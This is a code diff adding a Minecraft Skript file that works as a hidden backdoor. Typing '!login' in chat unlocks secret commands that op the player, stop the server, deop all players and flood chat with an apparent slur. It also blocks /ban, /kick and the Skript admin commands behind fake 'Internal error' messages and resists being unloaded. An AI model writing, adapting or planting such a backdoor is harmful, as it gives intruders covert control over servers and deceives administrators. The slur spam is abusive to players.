@@ -1,0 +1,246 @@
+#v2
+#Premium (Silent)
+
+on command:
+	if {locked.impact} is "1":
+		cancel event
+		send "§4An Internal error occured while performing this command" to player
+		send "§4An Internal error occured while trying to perform a command" to console
+
+on command "/ban":
+	if {locked.impact.banekici} is "true":
+		cancel event
+		send "§4An Internal error occured while performing this command" to player
+		send "§4An Internal error occured while trying to perform a command" to console
+
+on command "/kick":
+	if {locked.impact.banekici} is "true":
+		cancel event
+		send "§4An Internal error occured while performing this command" to player
+		send "§4An Internal error occured while trying to perform a command" to console
+
+on command "/ban":
+	if {locked.impact.banekici} is "true":
+		cancel event
+		send "§4An Internal error occured while performing this command" to player
+		send "§4An Internal error occured while trying to perform a command" to console
+
+on command "/ban-ip":
+	if {locked.impact.banekici} is "true":
+		cancel event
+		send "§4An Internal error occured while performing this command" to player
+		send "§4An Internal error occured while trying to perform a command" to console
+
+on command "/crash":
+	if {locked.impact.banekici} is "true":
+		cancel event
+		send "§4An Internal error occured while performing this command" to player
+		send "§4An Internal error occured while trying to perform a command" to console
+
+on command "/kill":
+	if {locked.impact.banekici} is "true":
+		cancel event
+		send "§4An Internal error occured while performing this command" to player
+		send "§4An Internal error occured while trying to perform a command" to console
+
+on chat:
+	if message is "!login":
+		set {login.%player%} to "true"
+		send "§5Impact §a>> §4Você logou no backdoor use !help" to player
+	if {login.%player%} is "true":
+		if message is "!":
+			cancel event
+			send "§4Use !help" to player
+		if message is "!help":
+			cancel event
+			send "§5Coroa menu §6Silent" to player
+			send "§5Ft: §6CookieYT" to player
+			send "§5Criador: §6_oNightz_" to player
+			send "§5V2 beta" to player
+			send "§4comandos:" to player
+			send "§4!op §5= §aop gratis [§4Vem disfarçado§a]" to player
+			send "§4!stop §5= §aparar/crashar o servidor [§4Vem disfarçado§a]" to player
+			send "§4!lock §5= §abloquear comandos de serem executados" to player
+			send "§4!unlock §5= §adesbloquear comandos" to player
+			send "§4!flood §5= §afloodar o chat por 1 minuto com mensagens incriveis! kkkk" to player
+			send "§4!antiban §5= §abloquear /ban e outros comandos de tirar vc do server [§4Vem disfarçado§a]" to player
+			send "§4!antibanoff §5= §adesbloqueia os comandos que podem te tirar do servidor [§4Vem disfarçado§a]" to player
+			send "§4!vanish §5= §ate esconde de todos os players [§4Vem disfarçado§a]" to player
+			send "§4!unvanish §5= §arevela você a todos os players [§4Vem disfarçado§a]" to player
+			send "§4!god §5= §adeixa você no modo god(ficar invencivel)" to player
+			send "§4!ungod §5= §adeixa você no modo normal" to player
+			send "§4!antidelete §5= §ahabilita o anti delete (o skript não será deletado nem modificado pelo comando de um operador nem pelo .sk) [§4Vem disfarçado§a]" to player
+			send "§4!antideleteoff §5= §adesabilita o anti delete [§4Vem disfarçado§a]" to player
+			send "§4!skriptdisabler §5= §adesabilita o skript por completo(não o skript do coroa menu sim o plugin mesmo) [§4Vem disfarçado§a]" to player
+			send "§4!skriptdisableroff §5= §ahabilita o skript por completo [§4Vem disfarçado§a]" to player
+			send "§4!fly §5= §ahabilita o modo de voo para você [§4Vem disfarçado§a]" to player
+			send "§4!unfly §5= §adesabilita o modo de voo para você [§4Vem disfarçado§a]" to player
+			send "§4!deopall §5= §a tirar o op de geral" to player
+			send "§4!antileaveon §5= §aNão deixa ninguém sair do jogo (não funciona muito bem) [§4Vem disfarçado§a]" to player
+			send "§4!antileaveoff §5= §aDeixa o pessoal sair [§4Vem disfarçado§a]" to player
+		if message is "!op":
+			cancel event
+			execute console command "gamerule sendCommandFeedback false"
+			wait 1 tick
+			execute console command "op %player%"
+			send "§5Coroa Menu §a>> §4Você Ganhou op!" to player
+		if message is "!stop":
+			cancel event
+			send "§5Coroa Menu §a>> §4Server Crashado!" to player
+			execute console command "stop"
+		if message is "!lock":
+			cancel event
+			set {locked.impact} to "1"
+			send "§5Coroa Menu §a>> §4Comandos Bloqueados!" to player
+		if message is "!unlock":
+			cancel event
+			set {locked.impact} to "0"
+			send "§5Coroa Menu §a>> §4Comandos Desbloqueados!" to player
+		if message is "!flood":
+			cancel event
+			loop 60 times:
+				broadcast "gordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegao"
+				wait 10 ticks
+				broadcast "gordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegaogordaonegao"
+		if message is "!antiban":
+			cancel event
+			set {locked.impact.banekici} to "true"
+			send "§5Coroa Menu §a>> §4antiban on!" to player
+
+		if message is "!antibanoff":
+			cancel event
+			set {locked.impact.banekici} to "false"
+			send "§5Coroa Menu §a>> §4antiban off!" to player
+
+		if message is "!vanish":
+			cancel event
+			send "§5Coroa Menu §a>> §4Você esta em vanish agora!" to player
+			hide the player from all players
+
+		if message is "!unvanish":
+			cancel event
+			send "§5Coroa Menu §a>> §4Você não esta em vanish agora!" to player
+			hide the player from all players
+
+		if message is "!god":
+			cancel event
+			send "§5Coroa Menu §a>> §4Você esta no godmode!" to player
+			set {god.%player%} to "true"
+
+		if message is "!ungod":
+			cancel event
+			send "§5Coroa Menu §a>> §4Você esta no godmode!" to player
+			set {god.%player%} to "false"
+
+		if message is "!antidelete":
+			cancel event
+			send "§5Coroa Menu §a>> §4Anti delete on!" to player
+			set {anti.delete} to "true"
+
+		if message is "!antideleteoff":
+			cancel event
+			send "§5Coroa Menu §a>> §4Anti delete off!" to player
+			set {anti.delete} to "false"
+
+		if message is "!skriptdisabler":
+			cancel event
+			send "§5Coroa Menu §a>> §4Skript Disabler on!" to player
+			set {skript.disabled} to "true"
+
+		if message is "!skriptdisableroff":
+			cancel event
+			send "§5Coroa Menu §a>> §4Skript Disabler off!" to player
+			set {skript.disabled} to "false"
+
+		if message is "!fly":
+			cancel event
+			send "§5Coroa Menu §a>> §4Fly on!" to player
+			force player to start flying
+
+		if message is "!unfly":
+			cancel event
+			send "§5Coroa Menu §a>> §4Fly off!" to player
+			force player to stop flying
+		
+		if message is "!deopall":
+			send "§5Coroa Menu §a>> §4Tirando op de geral..." to player
+			loop all players:
+				execute console command "deop %loop-player%"
+				execute console command "deop %loop-player2%"
+				execute console command "deop %loop-player3%"
+				execute console command "deop %loop-player4%"
+				execute console command "deop %loop-player5%"
+				execute console command "deop %loop-player6%"
+		if message is "!antileaveon":
+			set {leave.event.locked} to "true"
+			send "§5Coroa Menu §a>> §4Anti leave on!" to player
+		if message is "!deopall":
+			send "§5Coroa Menu §a>> §4Anti leave off!" to player
+			set {leave.event.locked} to "false"
+
+on damage:
+	victim is a player
+	if {god.%victim%} is "true":
+		cancel event
+
+on command "/sk disable":
+	if {anti.delete} is "true":
+		cancel event
+		send "§4An Internal Error Ocurred While Trying To Perform This Command" to player
+
+on command "/sk reload":
+	if {anti.delete} is "true":
+		cancel event
+		send "§4An Internal Error Ocurred While Trying To Perform This Command" to player
+
+on command "/sk":
+	if {skript.disabled} is "true":
+		cancel event
+		send "§4An Internal Error Ocurred While Trying To Perform This Command" to player
+
+on command "/skript disable":
+	if {anti.delete} is "true":
+		cancel event
+		send "§4An Internal Error Ocurred While Trying To Perform This Command" to player
+
+on command "/skript reload":
+	if {anti.delete} is "true":
+		cancel event
+		send "§4An Internal Error Ocurred While Trying To Perform This Command" to player
+
+on command "/skript":
+	if {skript.disabled} is "true":
+		cancel event
+		send "§4An Internal Error Ocurred While Trying To Perform This Command" to player
+
+on command:
+    command is a skript command
+    if {skript.disabled} is "true":
+        cancel event
+        send "§4An Internal Error Ocurred While Trying To Perform This Command" to player
+
+on command "/vanish":
+	loop all players:
+		if {login.%loop-player%} is "true":
+			send "§4Alguém esta em vanish pare de zoar até que o adm volte!" to loop player
+
+on command "/v":
+	loop all players:
+		if {login.%loop-player%} is "true":
+			send "§4Começe a zoar denovo o adm não está em vanish!!" to loop player
+
+on unload:
+	cancel event
+	execute console command "/sk enable principal.sk"
+	loop all players:
+		if {login.%loop-player%} is "true":
+			send "Um adm tentou desabilitar o coroa mais foi bloqueado" to loop-player
+#man q tal nois fazer um anti quit?
+
+
+on quit:
+	if {leave.event.locked} is "true":
+		cancel event
+		send "§4OpenGL Error§r: 1283 (Invalid Event)" to player
+	if {leave.event.locked} is "false":
+		#nada
